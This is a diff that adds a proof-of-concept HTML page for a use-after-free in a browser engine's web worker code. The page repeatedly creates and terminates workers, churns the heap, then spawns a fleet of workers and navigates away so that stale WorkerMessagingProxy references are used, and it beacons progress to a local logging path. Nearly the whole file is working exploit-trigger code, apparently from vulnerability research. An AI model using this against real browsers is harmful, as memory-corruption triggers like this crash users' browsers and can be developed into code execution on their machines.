@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>worker proxy uaf</title></head>
+<body><script>
+// Target: shipped WorkerThread.h:139-142 keeps C++ references to the proxies the
+// main thread owns (WorkerMessagingProxy). Upstream fix 926054f254 replaced them
+// with raw pointers + clearProxies(); the reported crash is
+// createCacheStorageConnection() on the stale WorkerLoaderProxy.
+// WorkerGlobalScope has `caches` on this build (beacon WK-RAW-ALIVE caches=object),
+// so caches.open() inside a worker is the reachable call site.
+
+function beacon(tag) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon/' + encodeURIComponent(tag) + '?t=' + Date.now(), false);
+    x.send(null);
+  } catch (e) {}
+}
+function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
+function churn(n, size) {
+  var keep = [];
+  for (var i = 0; i < n; i++) keep.push(new Array((size / 8) | 0).join('C'));
+  keep.push(null);
+  return keep.length;
+}
+
+var STORM = '/raw/wk_storm.js?v=4';
+
+async function arm(killDelay, rounds, label) {
+  beacon(label + ' start delay=' + killDelay);
+  for (var r = 0; r < rounds; r++) {
+    var w;
+    try { w = new Worker(STORM + '&t=' + Date.now()); } catch (e) { beacon(label + ' ctor-exc ' + (e && e.name)); return; }
+    w.onerror = function () {};
+    w.postMessage({ n: 400, mode: 'fetch' });
+    await sleep(killDelay);
+    try { w.terminate(); } catch (e) {}
+    w = null;
+    churn(8 + (r % 4), 4096);
+    if ((r % 4) === 0) beacon(label + ' r=' + r + ' alive');
+    await sleep(25);
+  }
+  beacon(label + ' done');
+}
+
+async function run() {
+  beacon('WK-START');
+
+  // stage 0: is CacheStorage actually enabled for workers here?
+  await new Promise(function(res) {
+    var w = new Worker(STORM + '&t=' + Date.now());
+    w.onerror = function(ev) { beacon('WK-PROBE-ERR ' + (ev && ev.message)); };
+    w.postMessage({ n: 3, mode: 'fetch' });
+    setTimeout(function() { try { w.terminate(); } catch (e) {} res(); }, 900);
+  });
+
+  await arm(2, 30, 'WK-A');
+  await arm(10, 30, 'WK-B');
+  await arm(50, 20, 'WK-C');
+  // destroy the proxies by navigating away while many loader tasks are queued:
+  // Document teardown drops the Worker objects (and their WorkerMessagingProxy)
+  // while the worker threads still post tasks through the stale reference.
+  var fleet = [];
+  for (var f = 0; f < 10; f++) {
+    try {
+      var fw = new Worker(STORM + '&t=' + Date.now() + '&f=' + f);
+      fw.onerror = function () {};
+      fw.postMessage({ n: 4000, mode: 'fetch' });
+      fleet.push(fw);
+    } catch (e) { beacon('WK-FLEET-exc ' + (e && e.name)); }
+  }
+  beacon('WK-FLEET n=' + fleet.length);
+  await sleep(120);
+  // drop our references first, then navigate: double the destruction path
+  fleet.length = 0;
+  beacon('WK-RELOAD');
+  location.replace('/corpus/poc-worker.html?t=' + Date.now());
+}
+
+run().catch(function (e) { beacon('WK-FATAL ' + (e && e.name) + ' ' + (e && e.message)); });
+</script></body></html>
